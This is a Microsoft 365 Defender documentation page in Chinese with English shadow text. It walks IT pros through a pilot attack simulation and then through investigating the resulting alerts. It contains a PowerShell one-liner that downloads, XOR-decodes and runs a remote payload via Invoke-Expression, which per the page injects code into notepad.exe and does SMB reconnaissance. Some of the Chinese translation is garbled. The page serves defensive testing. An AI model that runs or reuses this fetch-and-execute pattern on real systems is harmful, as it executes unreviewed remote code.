---
title: 运行攻击Microsoft 365 Defender模拟
description: 为试点Microsoft 365 Defender攻击模拟，以查看其展开方式并快速修复。
keywords: Microsoft 365 Defender试点攻击模拟，运行 Microsoft 365 Defender 试点攻击模拟，模拟 Microsoft 365 Defender、 Microsoft 365 Defender 试点项目中的攻击、网络安全、高级永久性威胁、企业安全、设备、设备、标识、用户、数据、应用程序、事件、自动调查和修正、高级搜寻
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 9856f86532bdcf0befbcdbdb7c6dc6bf89fe63b5
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 07/16/2021
ms.locfileid: "53457712"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="7d333-104">运行攻击Microsoft 365 Defender模拟</span><span class="sxs-lookup"><span data-stu-id="7d333-104">Run your Microsoft 365 Defender attack simulations</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="7d333-105">[![计划](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="7d333-105">[![Planning](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)</span></span><br/>[<span data-ttu-id="7d333-106">规划</span><span class="sxs-lookup"><span data-stu-id="7d333-106">Planning</span></span>](m365d-pilot-plan.md)|<span data-ttu-id="7d333-107">[![准备](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)</span><span class="sxs-lookup"><span data-stu-id="7d333-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)</span></span><br/>[<span data-ttu-id="7d333-108">准备</span><span class="sxs-lookup"><span data-stu-id="7d333-108">Preparation</span></span>](prepare-m365d-eval.md)|![模拟攻击](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="7d333-110">模拟攻击</span><span class="sxs-lookup"><span data-stu-id="7d333-110">Simulate attack</span></span>|<span data-ttu-id="7d333-111">[![结束和汇总](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="7d333-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)</span></span><br/>[<span data-ttu-id="7d333-112">结束和汇总</span><span class="sxs-lookup"><span data-stu-id="7d333-112">Close and summarize</span></span>](m365d-pilot-close.md)|
|--|--|--|--|
|||<span data-ttu-id="7d333-113">*你在这里！*</span><span class="sxs-lookup"><span data-stu-id="7d333-113">*You are here!*</span></span>||

<span data-ttu-id="7d333-114">你当前处于攻击模拟阶段。</span><span class="sxs-lookup"><span data-stu-id="7d333-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="7d333-115">准备试点环境后，可以测试事件管理Microsoft 365 Defender自动调查和修正功能。</span><span class="sxs-lookup"><span data-stu-id="7d333-115">After preparing your pilot environment, it's time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="7d333-116">我们将帮助你模拟复杂的攻击，该攻击利用高级技术在检测中隐藏。</span><span class="sxs-lookup"><span data-stu-id="7d333-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="7d333-117">该攻击枚举域控制器上打开 (SMB) 会话，并检索用户设备的最新 IP 地址。</span><span class="sxs-lookup"><span data-stu-id="7d333-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="7d333-118">此类攻击通常不包括在被攻击的设备上丢弃的文件，它们仅出现在内存中。</span><span class="sxs-lookup"><span data-stu-id="7d333-118">This category of attacks usually doesn't include files dropped on the victim's device—they occur solely in memory.</span></span> <span data-ttu-id="7d333-119">他们通过使用现有系统和管理工具"离开陆地"，将其代码注入系统进程以隐藏其执行，此类行为允许他们规避检测并保留在设备上。</span><span class="sxs-lookup"><span data-stu-id="7d333-119">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="7d333-120">在此模拟中，我们的示例方案从 PowerShell 脚本开始。</span><span class="sxs-lookup"><span data-stu-id="7d333-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="7d333-121">用户可能会被欺骗运行脚本。</span><span class="sxs-lookup"><span data-stu-id="7d333-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="7d333-122">或者，脚本可能从远程连接从以前受感染的设备（尝试在网络中进行后向移动的攻击者）从远程连接运行到另一台计算机。</span><span class="sxs-lookup"><span data-stu-id="7d333-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="7d333-123">检测这些脚本可能很困难，因为管理员通常还远程运行脚本以执行各种管理活动。</span><span class="sxs-lookup"><span data-stu-id="7d333-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![使用进程注入和 SMB 重新连接攻击图表的无文件 PowerShell 攻击](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="7d333-125">在模拟过程中，该攻击将 shellcode 注入一个看起来不一样的过程。</span><span class="sxs-lookup"><span data-stu-id="7d333-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="7d333-126">此方案需要使用notepad.exe。</span><span class="sxs-lookup"><span data-stu-id="7d333-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="7d333-127">我们选择了此过程进行模拟，但攻击者更有可能针对长时间运行的系统进程，例如svchost.exe。</span><span class="sxs-lookup"><span data-stu-id="7d333-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="7d333-128">然后，shellcode 继续联系攻击者的命令和控制 (C2) 服务器，以接收有关如何继续的说明。</span><span class="sxs-lookup"><span data-stu-id="7d333-128">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="7d333-129">该脚本尝试对 DC 服务器中的域控制器 (重新) 。</span><span class="sxs-lookup"><span data-stu-id="7d333-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="7d333-130">重新集成允许攻击者获取有关最近用户登录信息的信息。</span><span class="sxs-lookup"><span data-stu-id="7d333-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="7d333-131">一旦攻击者获得此信息，他们就可以在网络中进行稍后移动，以到达特定的敏感帐户</span><span class="sxs-lookup"><span data-stu-id="7d333-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="7d333-132">为了获得最佳结果，请尽可能遵循攻击模拟说明。</span><span class="sxs-lookup"><span data-stu-id="7d333-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

## <a name="simulation-environment-requirements"></a><span data-ttu-id="7d333-133">模拟环境要求</span><span class="sxs-lookup"><span data-stu-id="7d333-133">Simulation environment requirements</span></span>

<span data-ttu-id="7d333-134">由于已在准备阶段配置了试点环境，因此请确保有两个设备用于此方案：测试设备和域控制器。</span><span class="sxs-lookup"><span data-stu-id="7d333-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1. <span data-ttu-id="7d333-135">验证租户是否[已启用Microsoft 365 Defender。](m365d-enable.md#confirm-that-the-service-is-on)</span><span class="sxs-lookup"><span data-stu-id="7d333-135">Verify your tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="7d333-136">验证测试域控制器配置：</span><span class="sxs-lookup"><span data-stu-id="7d333-136">Verify your test domain controller configuration:</span></span>

   - <span data-ttu-id="7d333-137">设备使用 Windows Server 2008 R2 或更高版本运行。</span><span class="sxs-lookup"><span data-stu-id="7d333-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="7d333-138">测试域控制器到 [Microsoft Defender 的标识并](/azure/security-center/security-center-wdatp) 启用 [远程管理](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。</span><span class="sxs-lookup"><span data-stu-id="7d333-138">The test domain controller to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and enable [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="7d333-139">验证是否[已启用 Microsoft Defender 的标识Microsoft Cloud App Security集成](/cloud-app-security/mdi-integration)。</span><span class="sxs-lookup"><span data-stu-id="7d333-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) have been enabled.</span></span>
   - <span data-ttu-id="7d333-140">在域中创建测试用户 - 无需管理员权限。</span><span class="sxs-lookup"><span data-stu-id="7d333-140">A test user is created on your domain – no admin permissions needed.</span></span>

3. <span data-ttu-id="7d333-141">验证测试设备配置：</span><span class="sxs-lookup"><span data-stu-id="7d333-141">Verify test device configuration:</span></span>

   1. <span data-ttu-id="7d333-142">设备使用 Windows 10版本 1903 或更高版本运行。</span><span class="sxs-lookup"><span data-stu-id="7d333-142">Device runs with Windows 10 version 1903 or a later version.</span></span>

   1. <span data-ttu-id="7d333-143">测试设备已加入测试域。</span><span class="sxs-lookup"><span data-stu-id="7d333-143">Test device is joined to the test domain.</span></span>

   1. <span data-ttu-id="7d333-144">[打开"Windows Defender 防病毒"。](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)</span><span class="sxs-lookup"><span data-stu-id="7d333-144">[Turn on Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7d333-145">如果无法启用Windows Defender 防病毒，请参阅此[疑难解答主题](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="7d333-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>

   1. <span data-ttu-id="7d333-146">验证测试设备已载入[Microsoft Defender 终结点) 。 ](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="7d333-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="7d333-147">如果使用现有租户并实施设备组，请为测试设备创建专用设备组，并推送到配置 UX 中的顶层。</span><span class="sxs-lookup"><span data-stu-id="7d333-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>

## <a name="run-the-attack-scenario-simulation"></a><span data-ttu-id="7d333-148">运行攻击方案模拟</span><span class="sxs-lookup"><span data-stu-id="7d333-148">Run the attack scenario simulation</span></span>

<span data-ttu-id="7d333-149">运行攻击方案模拟：</span><span class="sxs-lookup"><span data-stu-id="7d333-149">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="7d333-150">使用测试用户帐户登录到测试设备。</span><span class="sxs-lookup"><span data-stu-id="7d333-150">Log in to the test device with the test user account.</span></span>

2. <span data-ttu-id="7d333-151">在测试Windows PowerShell打开一个"打开"窗口。</span><span class="sxs-lookup"><span data-stu-id="7d333-151">Open a Windows PowerShell window on the test device.</span></span>

3. <span data-ttu-id="7d333-152">复制以下模拟脚本：</span><span class="sxs-lookup"><span data-stu-id="7d333-152">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="7d333-153">如果在 Web 浏览器中打开此文档，则可能无法复制全文而不丢失某些字符或引入额外的换行符。</span><span class="sxs-lookup"><span data-stu-id="7d333-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="7d333-154">下载此文档，在 Adobe Reader 上打开它。</span><span class="sxs-lookup"><span data-stu-id="7d333-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="7d333-155">在提示符下，粘贴并运行复制的脚本。</span><span class="sxs-lookup"><span data-stu-id="7d333-155">At the prompt, paste and run the copied script.</span></span>

> [!NOTE]
> <span data-ttu-id="7d333-156">如果使用远程桌面协议 (RDP) 运行 PowerShell，请使用 RDP 客户端中的"键入剪贴板文本"命令，因为 **CTRL-V** 热键或右键单击粘贴方法可能不起作用。</span><span class="sxs-lookup"><span data-stu-id="7d333-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="7d333-157">PowerShell 的最新版本有时也不接受该方法，您可能首先必须复制到内存中的 记事本，将其复制到虚拟机中，然后将其粘贴到 PowerShell 中。</span><span class="sxs-lookup"><span data-stu-id="7d333-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="7d333-158">几秒钟后，notepad.exe<i>打开。</i></span><span class="sxs-lookup"><span data-stu-id="7d333-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="7d333-159">模拟攻击代码将注入到notepad.exe。</span><span class="sxs-lookup"><span data-stu-id="7d333-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="7d333-160">将自动生成的记事本实例保持打开状态，以体验完整方案。</span><span class="sxs-lookup"><span data-stu-id="7d333-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="7d333-161">模拟攻击代码将尝试与外部 IP 地址通信 (模拟 C2 服务器) 然后尝试通过 SMB 重新对域控制器进行重新连接。</span><span class="sxs-lookup"><span data-stu-id="7d333-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="7d333-162">此脚本完成后，你将看到 PowerShell 控制台上显示的消息。</span><span class="sxs-lookup"><span data-stu-id="7d333-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="7d333-163">To see the Automated Incident and Response feature in action， keep the notepad.exe process open.</span><span class="sxs-lookup"><span data-stu-id="7d333-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="7d333-164">你将看到自动事件和响应停止记事本进程。</span><span class="sxs-lookup"><span data-stu-id="7d333-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>

## <a name="investigate-an-incident"></a><span data-ttu-id="7d333-165">调查事件</span><span class="sxs-lookup"><span data-stu-id="7d333-165">Investigate an incident</span></span>

> [!NOTE]
> <span data-ttu-id="7d333-166">在我们演示此模拟之前，请观看以下视频，了解事件管理如何有助于将相关警报作为调查过程的一部分一起处理，在哪里可以找到门户中的警报，以及如何帮助你执行安全操作：</span><span class="sxs-lookup"><span data-stu-id="7d333-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="7d333-167">切换到 SOC 分析员的角度，你现在可以在安全中心门户中开始Microsoft 365攻击。</span><span class="sxs-lookup"><span data-stu-id="7d333-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span>

1. <span data-ttu-id="7d333-168">从任何[Microsoft 365打开安全中心](https://security.microsoft.com/incidents)门户事件队列。</span><span class="sxs-lookup"><span data-stu-id="7d333-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2. <span data-ttu-id="7d333-169">从 **菜单导航到** "事件"。</span><span class="sxs-lookup"><span data-stu-id="7d333-169">Navigate to **Incidents** from the menu.</span></span>

    ![事件屏幕截图，如Microsoft 365安全中心的左侧菜单上所示](../../media/mtp/fig1.png)

3. <span data-ttu-id="7d333-171">模拟攻击的新事件将显示在事件队列中。</span><span class="sxs-lookup"><span data-stu-id="7d333-171">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![事件队列的屏幕截图](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="7d333-173">将攻击作为单个事件进行调查</span><span class="sxs-lookup"><span data-stu-id="7d333-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="7d333-174">Microsoft 365 Defender分析关联，并将不同产品的相关警报和调查聚合到一个事件实体中。</span><span class="sxs-lookup"><span data-stu-id="7d333-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="7d333-175">通过执行此操作，Microsoft 365 Defender更广泛的攻击案例，让 SOC 分析师可以了解和响应复杂的威胁。</span><span class="sxs-lookup"><span data-stu-id="7d333-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="7d333-176">此模拟期间生成的警报与同一威胁相关联，因此，自动聚合为单个事件。</span><span class="sxs-lookup"><span data-stu-id="7d333-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="7d333-177">查看事件：</span><span class="sxs-lookup"><span data-stu-id="7d333-177">To view the incident:</span></span>

1. <span data-ttu-id="7d333-178">导航到 **事件** 队列。</span><span class="sxs-lookup"><span data-stu-id="7d333-178">Navigate to the **Incidents** queue.</span></span>

   ![导航菜单中的事件屏幕截图](../../media/mtp/fig1.png)

2. <span data-ttu-id="7d333-180">单击事件名称左侧的圆圈，选择最新项。</span><span class="sxs-lookup"><span data-stu-id="7d333-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="7d333-181">侧面板显示有关事件的其他信息，包括所有相关警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="7d333-182">每个事件都有一个唯一的名称，该名称根据事件包括的警报的属性进行描述。</span><span class="sxs-lookup"><span data-stu-id="7d333-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   ![在模拟期间聚合生成的警报的事件页面的屏幕截图](../../media/mtp/fig4.png)

   <span data-ttu-id="7d333-184">可以基于以下服务资源筛选显示在仪表板中的警报：Microsoft Defender for Identity、Microsoft Cloud App Security、Microsoft Defender for Endpoint、Microsoft 365 Defender 和 Microsoft Defender for Office 365。</span><span class="sxs-lookup"><span data-stu-id="7d333-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="7d333-185">选择 **"打开事件** 页面"获取有关事件详细信息。</span><span class="sxs-lookup"><span data-stu-id="7d333-185">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="7d333-186">在 **"事件** "页中，你可以看到与事件相关的所有警报和信息。</span><span class="sxs-lookup"><span data-stu-id="7d333-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="7d333-187">该信息包括警报中涉及的实体和资产、警报的检测源 (Microsoft Defender for Identity、EDR) ，以及它们链接在一起的原因。</span><span class="sxs-lookup"><span data-stu-id="7d333-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="7d333-188">查看事件警报列表将显示攻击进度。</span><span class="sxs-lookup"><span data-stu-id="7d333-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="7d333-189">从此视图中，你可以查看和调查各个警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-189">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="7d333-190">您还可以从右侧 **菜单中** 单击"管理事件"，以标记事件、将其分配给自己并添加注释。</span><span class="sxs-lookup"><span data-stu-id="7d333-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

   ![单击"管理事件"位置的屏幕截图](../../media/mtp/fig5a.png)

   ![可在管理事件面板上标记事件、将其分配给自己并添加注释的字段的屏幕截图](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a><span data-ttu-id="7d333-193">查看生成的警报</span><span class="sxs-lookup"><span data-stu-id="7d333-193">Review generated alerts</span></span>

<span data-ttu-id="7d333-194">让我们看一下模拟攻击期间生成的一些警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-194">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="7d333-195">我们将仅演练模拟攻击期间生成的一些警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-195">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="7d333-196">根据测试设备上Windows的 Microsoft 365 Defender 版本，你可能会看到按略有不同的顺序显示更多警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![生成的警报的屏幕截图](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="7d333-198">警报：发现可疑进程注入 (源：Microsoft Defender for Endpoint EDR) </span><span class="sxs-lookup"><span data-stu-id="7d333-198">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="7d333-199">高级攻击者使用复杂而复杂的方法来保留内存，并隐藏在检测工具中。</span><span class="sxs-lookup"><span data-stu-id="7d333-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="7d333-200">一种常见技术是在受信任的系统进程（而不是恶意可执行文件）内进行操作，使得检测工具和安全操作难以发现恶意代码。</span><span class="sxs-lookup"><span data-stu-id="7d333-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="7d333-201">为了允许 SOC 分析师捕获这些高级攻击，Microsoft Defender for Endpoint 中的深度内存传感器为云服务提供了对各种跨进程代码注入技术的前所未有的可见性。</span><span class="sxs-lookup"><span data-stu-id="7d333-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="7d333-202">下图显示了在尝试向终结点注入代码时如何检测到 Defender for Endpoint 并<i>notepad.exe。 </i></span><span class="sxs-lookup"><span data-stu-id="7d333-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![有关注入潜在恶意代码的警报的屏幕截图](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="7d333-204">警报：进程在运行时观察到的意外行为，没有命令行参数 (Source： Microsoft Defender for Endpoint EDR) </span><span class="sxs-lookup"><span data-stu-id="7d333-204">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="7d333-205">Microsoft Defender 终结点检测通常针对攻击技术最常见的属性。</span><span class="sxs-lookup"><span data-stu-id="7d333-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="7d333-206">此方法可确保持续性，并提升攻击者切换到较新策略的漏洞。</span><span class="sxs-lookup"><span data-stu-id="7d333-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="7d333-207">我们采用大规模学习算法来建立组织和全球通用流程的正常行为，并观察这些流程何时显示异常行为。</span><span class="sxs-lookup"><span data-stu-id="7d333-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="7d333-208">这些异常行为通常指示已引入多余的代码，并且正在其他受信任进程中运行。</span><span class="sxs-lookup"><span data-stu-id="7d333-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="7d333-209">对于此方案 <i> ，notepad.exe</i> 出现异常行为，包括与外部位置的通信。</span><span class="sxs-lookup"><span data-stu-id="7d333-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="7d333-210">此结果独立于用于引入和执行恶意代码的特定方法。</span><span class="sxs-lookup"><span data-stu-id="7d333-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="7d333-211">由于此警报基于需要额外后端处理的机器学习模型，因此在门户中看到此警报可能需要一些时间。</span><span class="sxs-lookup"><span data-stu-id="7d333-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="7d333-212">请注意，警报详细信息包括外部 IP 地址，该地址是一个可用于扩展调查的指示器。</span><span class="sxs-lookup"><span data-stu-id="7d333-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="7d333-213">选择警报进程树中的 IP 地址以查看 IP 地址详细信息页面。</span><span class="sxs-lookup"><span data-stu-id="7d333-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![无命令行参数的进程运行时出现意外行为警报的屏幕截图](../../media/mtp/fig8.png)

<span data-ttu-id="7d333-215">下图显示了选中的 IP 地址详细信息页面 (警报进程树中的 IP 地址) 。</span><span class="sxs-lookup"><span data-stu-id="7d333-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="7d333-216">![IP 地址详细信息页面的屏幕截图](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="7d333-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="7d333-217">警报：SMB 用户和 IP 地址重新 (源)  (：Microsoft Defender for Identity) </span><span class="sxs-lookup"><span data-stu-id="7d333-217">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="7d333-218">使用服务器消息块 (SMB) 协议的枚举使攻击者能够获取最近的用户登录信息，这些信息可帮助他们稍后通过网络移动来访问特定的敏感帐户。</span><span class="sxs-lookup"><span data-stu-id="7d333-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="7d333-219">在此检测中，当 SMB 会话枚举针对域控制器运行时，将触发警报。</span><span class="sxs-lookup"><span data-stu-id="7d333-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![用户和 IP 地址重新重发的 Microsoft Defender 标识警报屏幕截图](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="7d333-221">查看设备时间线 [Microsoft Defender for Endpoint]</span><span class="sxs-lookup"><span data-stu-id="7d333-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>

<span data-ttu-id="7d333-222">在浏览此事件中的各个警报后，导航回之前调查的事件页面。</span><span class="sxs-lookup"><span data-stu-id="7d333-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="7d333-223">选择 **事件页面中** 的"设备"选项卡，查看 Microsoft Defender for Endpoint 和 Microsoft Defender for Identity 报告的事件所涉及的设备。</span><span class="sxs-lookup"><span data-stu-id="7d333-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="7d333-224">选择执行攻击的设备的名称，以打开该特定设备的实体页面。</span><span class="sxs-lookup"><span data-stu-id="7d333-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="7d333-225">在此页面中，你可以看到触发的警报和相关事件。</span><span class="sxs-lookup"><span data-stu-id="7d333-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="7d333-226">选择 **"时间线** "选项卡以打开设备时间线，并按时间顺序查看在设备上观测到的所有事件和行为，这些事件和行为与所引发警报的交错。</span><span class="sxs-lookup"><span data-stu-id="7d333-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

